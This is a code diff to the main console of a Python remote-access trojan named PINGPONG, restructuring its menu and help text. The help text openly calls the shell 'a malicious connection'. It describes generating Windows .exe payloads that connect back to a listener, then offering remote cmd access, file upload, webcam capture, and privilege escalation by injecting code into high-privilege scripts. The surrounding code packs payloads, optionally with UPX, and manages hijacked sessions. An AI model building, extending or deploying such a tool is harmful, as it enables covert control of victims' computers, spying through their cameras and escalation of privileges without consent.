@@ -36,37 +36,85 @@ def print_main():
     \033[0m''')
     main()
 #选择
+def print_help():
+    print_good(""" 
+    -----------------------------HELP-----------------------------
+    for main:
+        command:
+            1) handler
+                start a listener on a ip and port
+                an ip and port must be given
+            2) payload
+                make a payload which can send a socket connect to a ip and port
+                an ip and port must be given
+                it will be a .exe file
+                start a handler and use that file and u can start a PINGPONG connection
+            3) settings
+                for handler:
+                    listen_Default_ip : the ip to bind when the ip is not given when u use the handler
+                    listen_Default_port : the port to bind when the port is not given when u use the handler
+                    Autocommand : the command which will run immediately when u got a PINGPONG shell
+                for payload:
+                    Default_ip : The ip to sent the connect when the ip is not given when u use the payload generater
+                    Default_port : The port to sent the connect when the port is not given when u use the payload generater
+                    usage : the usage of the payload
+            4) Help
+                for help
+            5) Session(s)
+                if you have already background some session(s), use this to choose your session to back interactive mode
+                if you do not, you will not have this choose
+            PING : printout PONG
+            help : for help
+            show_choice : show all the choice
+            reload : reload the settings
+    for PINGPONG shell
+        the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
+        usage:
+            the usage of the shell is set when you generate the payload
+            a PINGPONG payload must have those usage:
+                exit : exit the connection
+                help : for help
+                show_usage : print out the usage(s) the payload has
+                PING : check the connection. If it is good, return PONG
+                info : printout the ip and port of both the hosts
+            the below usage will be activate if u set it when u are generating the payload
+            if u have this usage, type command to use it:
+                cmd : make a cmd connection
+                upload : upload your file
+                cam_shot : take shot
+                priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher   
+            
+            """)
 def sub_main():
     session_pool = config_set.load_config_for_main_py('connect_pool')
     choice = input("choose your choice>")
-    if session_pool == None or session_pool == []:
-        if choice == '' or choice == ' ':
-            sub_main()
-        elif choice == "1":
-            startserver()
-        elif choice == "2":
-            sys.path.append('./payload')
-            import payload_packer
-            def payload_choice():
-                print_normal("type of payload:")
-                print_normal("1) PINGPONG windows x64")
-                type = input("payload>[*]choose your payload type>")
-                back_to_main(type)
-                if type == "1":
-                    # payload.payload_packer.pack("_basic_conn.py", ip, port, False)
-                    print_normal('the format of the payload')
-                    print_normal('1) .py')
-                    print_normal('2) .exe')
-                    # print_normal('3) .html')
-                    _format = input('payload>[*]choose your format>')
-                    back_to_main(_format)
-                    if _format == '1':
-                        upx_dir = ' '
-                        payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.py')
-                    elif _format == '2':
-                        upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
-                        back_to_main(upx_dir)
-                        payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe')
+    if choice == '' or choice == ' ':
+        sub_main()
+    elif choice == "1":
+        startserver()
+    elif choice == "2":
+        sys.path.append('./payload')
+        import payload_packer
+        def payload_choice():
+            print_normal("type of payload:")
+            print_normal("1) PINGPONG windows x64")
+            type = input("payload>[*]choose your payload type>")
+            back_to_main(type)
+            if type == "1":
+                # payload.payload_packer.pack("_basic_conn.py", ip, port, False)
+                print_normal('the format of the payload')
+                print_normal('1) .py')
+                print_normal('2) .exe')
+                # print_normal('3) .html')
+                _format = input('payload>[*]choose your format>')
+                back_to_main(_format)
+                if _format == '1':
+                    upx_dir = ' '
+                    payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.py')
+                elif _format == '2':
+                    upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
+                    back_to_main(upx_dir)
+                    payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe')
 #                     elif _format == '3':
 #                         upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
 #                         back_to_main(upx_dir)
@@ -88,128 +136,31 @@ def sub_main():
 # ''')
 #                         shutil.copy('./payload.exe', './payload_html/payload.exe') 
 #                         os.remove('./payload.exe')
-                else:
-                    print_error('[-]no such choice')
-                    payload_choice()
-            payload_choice()
-        elif choice == '3':
-            import config.config_settings_GUI
-            config.config_settings_GUI.load_all_config()
-            t = threading.Thread(target=config.config_settings_GUI.settings_GUI_INIT())
-            t.start()
-            t.join()
-            is_auto_load_config = config_set.load_config_for_main_py("is_auto_load_config")
-            is_auto_load_config = is_auto_load_config.get()
-            if is_auto_load_config == 1:
-                config_set.config_load()
             else:
-                print_warn("use 'reload' command to load your settings!")
-            sub_main()
-        elif choice == '4' or choice == 'help' or choice == 'HELP':
-            print_good(""" 
-    -----------------------------HELP-----------------------------
-    for main:
-        command:
-            1) handler
-                start a listener on a ip and port
-                an ip and port must be given
-            2) payload
-                make a payload which can send a socket connect to a ip and port
-                an ip and port must be given
-                it will be a .exe file
-                start a handler and use that file and u can start a PINGPONG connection
-            3) settings
-                for handler:
-                    listen_Default_ip : the ip to bind when the ip is not given when u use the handler
-                    listen_Default_port : the port to bind when the port is not given when u use the handler
-                    Autocommand : the command which will run immediately when u got a PINGPONG shell
-                for payload:
-                    Default_ip : The ip to sent the connect when the ip is not given when u use the payload generater
-                    Default_port : The port to sent the connect when the port is not given when u use the payload generater
-                    usage : the usage of the payload
-            4) Help
-                for help
-            5) Session(s)
-                if you have already background some session(s), use this to choose your session to back interactive mode
-                if you do not, you will not have this choose
-    for PINGPONG shell
-        the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
-        usage:
-            the usage of the shell is set when you generate the payload
-            a PINGPONG payload must have those usage:
-                exit : exit the connection
-                help : for help
-                show_usage : print out the usage(s) the payload has
-                PING : check the connection. If it is good, return PONG
-                info : printout the ip and port of both the hosts
-            the below usage will be activate if u set it when u are generating the payload
-            if u have this usage, type command to use it:
-                cmd : make a cmd connection
-                upload : upload your file
-                cam_shot : take shot
-                priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher   
-            
-            """)
-            main()
-
-        elif choice == "PING":
-            print("PONG")
-            sub_main()
-        elif choice == "exit":
-            print("exiting......")
-            sys.exit(0)
-        elif choice == "reload":
+                print_error('[-]no such choice')
+                payload_choice()
+        payload_choice()
+    elif choice == '3':
+        tmp = session_pool
+        import config.config_settings_GUI
+        config.config_settings_GUI.load_all_config()
+        t = threading.Thread(target=config.config_settings_GUI.settings_GUI_INIT())
+        t.start()
+        t.join()
+        is_auto_load_config = config_set.load_config_for_main_py("is_auto_load_config")
+        is_auto_load_config = is_auto_load_config.get()
+        if is_auto_load_config == 1:
             config_set.config_load()
-            print_normal('settings>[*]Done')
-            sub_main()
         else:
-            print_error("[-]no such choice")
+            print_warn("use 'reload' command to load your settings!")
+        set_config("connect_pool", tmp)
+        del tmp
+        sub_main()
+    elif choice == '4':
+        if session_pool == None or session_pool == []:
+            print_help()
             main()
-    else:
-        if choice == "1":
-            startserver()
-        elif choice == "2":
-            def payload_choice():
-                print_normal("type of payload:")
-                print_normal("1) PINGPONG windows x64")
-                type = input("payload>[*]choose your payload type>")
-                back_to_main(type)
-                if type == "1":
-                    # payload.payload_packer.pack("_basic_conn.py", ip, port, False)
-                    print_normal('the format of the payload')
-                    print_normal('1) .py')
-                    print_normal('2) .exe')
-                    _format = input('payload>[*]choose your format>')
-                    back_to_main(_format)
-                    if _format == '1':
-                        upx_dir = ' '
-                        payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.py')
-                    elif _format == '2':
-                        upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
-                        back_to_main(upx_dir)
-                        payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe')
-                    else:
-                        print_error('[-]so such choice')
-                        payload_choice()
-                    main()
-                else:
-                    print_error('[-]no such choice')
-                    payload_choice()
-            payload_choice()
-        elif choice == '3':
-            import config.config_settings_GUI
-            config.config_settings_GUI.load_all_config()
-            t = threading.Thread(target=config.config_settings_GUI.settings_GUI_INIT())
-            t.start()
-            t.join()
-            is_auto_load_config = config_set.load_config_for_main_py("is_auto_load_config")
-            is_auto_load_config = is_auto_load_config.get()
-            if is_auto_load_config == 1:
-                config_set.config_load()
-            else:
-                print_warn("use 'reload' command to load your settings!")
-            sub_main()
-        elif choice == '4' or choice == 'session' or choice == 'SESSION':
+        else:
             def back_to_sessions():
                 number_of_sessions = len(session_pool)
                 id_list = [i for i in range(1, number_of_sessions + 1)]
@@ -221,12 +172,13 @@ def sub_main():
                     session = session_pool[i - 1]
                     print_normal(f'''
     {i}  {session[5]}  {session[1]} : {session[2]} ---> {session[3]} : {session[4]}         ''')
+                    
                 try:
-                    input_id = int(input("sessions>[*]type the id of the session(type 'back' for main console)>"))
-                    back_to_main(input_id, is_print=True)
+                    input_id = input("sessions>[*]type the id of the session(type 'back' for main console)>")
+                    input_id = int(input_id)
                     session = session_pool[input_id - 1]
-                except Exception as e:
-                    print(e)
+                except:
+                    back_to_main(input_id)
                     print_error("sessions>[-]input error")
                     back_to_sessions()
                 session[0].send(bytes('OK', 'utf8'))
@@ -238,67 +190,33 @@ def sub_main():
                     # (cmd_SessObj, ip, cmd_port, _ip, _port, main_port, conn, cmd_session)
                     PINGPONG_script.cmdshell.cmd_shell(session[0], session[1], session[2], session[3], session[4], ' ', None, None)
             back_to_sessions()
-        elif choice == '5' or choice == 'help' or choice == 'HELP':
-            print_good(""" 
-    -----------------------------HELP-----------------------------
-    for main:
-        command:
-            1) handler
-                start a listener on a ip and port
-                an ip and port must be given
-            2) payload
-                make a payload which can send a socket connect to a ip and port
-                an ip and port must be given
-                it will be a .exe file
-                start a handler and use that file and u can start a PINGPONG connection
-            3) settings
-                for handler:
-                    listen_Default_ip : the ip to bind when the ip is not given when u use the handler
-                    listen_Default_port : the port to bind when the port is not given when u use the handler
-                    Autocommand : the command which will run immediately when u got a PINGPONG shell
-                for payload:
-                    Default_ip : The ip to sent the connect when the ip is not given when u use the payload generater
-                    Default_port : The port to sent the connect when the port is not given when u use the payload generater
-                    usage : the usage of the payload
-            4) Help
-                for help
-            5) Session(s)
-                if you have already background some session(s), use this to choose your session to back interactive mode
-                if you do not, you will not have this choose
-    for PINGPONG shell
-        the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
-        usage:
-            the usage of the shell is set when you generate the payload
-            a PINGPONG payload must have those usage:
-                exit : exit the connection
-                help : for help
-                show_usage : print out the usage(s) the payload has
-                PING : check the connection. If it is good, return PONG
-                info : printout the ip and port of both the hosts
-            the below usage will be activate if u set it when u are generating the payload
-            if u have this usage, type command to use it:
-                cmd : make a cmd connection
-                upload : upload your file
-                cam_shot : take shot
-                priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher   
-            
-            """)
-            main()
-
-        elif choice == "PING":
-            print("PONG")
-            sub_main()
-        elif choice == "exit":
-            print("exiting......")
-            sys.exit(0)
-        elif choice == "reload":
-            config_set.config_load()
-            print_normal('settings>[*]Done')
+    elif choice == '5':
+        if session_pool == None or session_pool == []:
+            print_error("[-]no such choice")
             sub_main()
         else:
-            print_error("[-]no such choice")
-            main()
-
+            print_help()
+            sub_main()
+    elif choice == 'help' or choice == 'HELP':
+        print_help()
+    elif choice == "PING":
+        print("PONG")
+        sub_main()
+    elif choice == "exit":
+        print("exiting......")
+        sys.exit(0)
+    elif choice == "reload":
+        tmp = session_pool
+        config_set.config_load()
+        set_config("connect_pool", tmp)
+        del tmp
+        print_normal('settings>[*]Done')
+        sub_main()
+    elif choice == 'show_choice':
+        main()
+    else:
+        print_error("[-]no such choice")
+        main()
 def main():
     print_normal("Active choice:")
     print_normal("1) Start a PINGPONG handler")
